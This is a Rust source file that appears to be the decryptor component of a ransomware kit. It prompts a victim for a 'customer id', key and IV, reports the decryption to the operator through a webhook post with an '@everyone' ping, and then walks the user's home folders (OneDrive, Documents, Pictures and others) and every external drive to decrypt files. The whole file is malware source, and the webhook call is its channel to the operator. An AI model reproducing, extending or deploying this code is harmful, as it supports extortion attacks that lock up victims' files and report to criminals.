use reqwest::blocking::Client;
use std::{collections, fs, io, path};

mod constants;
mod crypto;
mod filesystem;

fn decrypt_local_filesystem(customer: &crypto::Customer) {
    let folders = vec![
        "OneDrive",
        "Desktop",
        "Documents",
        "Downloads",
        "Videos",
        "Pictures",
        "Music",
    ];
    for folder in folders {
        walk_dir(
            path::Path::new(&format!(
                "{}\\{}",
                &dirs::home_dir().unwrap().display(),
                folder
            )),
            customer,
        );
    }
}

fn walk_dir(path: &path::Path, customer: &crypto::Customer) {
    if let Ok(contents) = fs::read_dir(path) {
        for entry in contents {
            let entry = entry.unwrap();
            match filesystem::check_dir_entry(&entry.path()) {
                0 => {
                    walk_dir(&entry.path(), customer);
                }
                1 => {
                    crypto::decrypt(&entry.path(), customer);
                }
                _ => (),
            }
        }
    }
}

pub fn report(message: &str) {
    let mut map = collections::HashMap::new();
    map.insert("content", message.to_string());

    let _response = Client::new()
        .post(constants::WEBHOOK_URL)
        .json(&map)
        .send()
        .expect("Server connection failed");
}

fn main() {
    println!("Enter your customer id:");
    let mut identification = String::new();
    io::stdin().read_line(&mut identification).unwrap();

    println!("Enter your key:");
    let mut key = String::new();
    io::stdin().read_line(&mut key).unwrap();

    println!("Enter your iv:");
    let mut iv = String::new();
    io::stdin().read_line(&mut iv).unwrap();

    let keypair = crypto::Keypair {
        key: key.split_at(32).0.to_string(),
        iv: iv.split_at(16).0.to_string(),
    };
    let customer = crypto::Customer {
        keypair,
        identification: identification.split_at(24).0.to_string(),
    };

    report(&format!(
        "@everyone **Client initiating decryption:** `{}`",
        customer.identification
    ));
    decrypt_local_filesystem(&customer);
    for entry in filesystem::get_external_drives() {
        walk_dir(&entry, &customer);
    }
}
